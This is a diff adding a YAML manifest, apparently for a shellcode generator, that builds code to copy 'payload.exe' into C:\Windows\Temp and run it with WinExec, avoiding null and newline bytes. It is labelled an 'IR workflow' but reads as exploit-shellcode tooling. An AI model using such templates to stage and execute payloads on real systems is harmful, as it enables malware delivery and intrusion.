@@ -1,0 +1,23 @@
+template: ir_copy_then_run
+# IR workflow: CopyFileA + WinExec with exit strategy.
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_copy_then_run.yaml \
+#       --src "C:\\source\\payload.exe" --dst "C:\\Windows\\Temp\\payload.exe" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - CopyFileA
+  - WinExec
+  - ExitProcess
+
+strings:
+  - label: src_path
+    value: "C:\\source\\payload.exe"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: edi
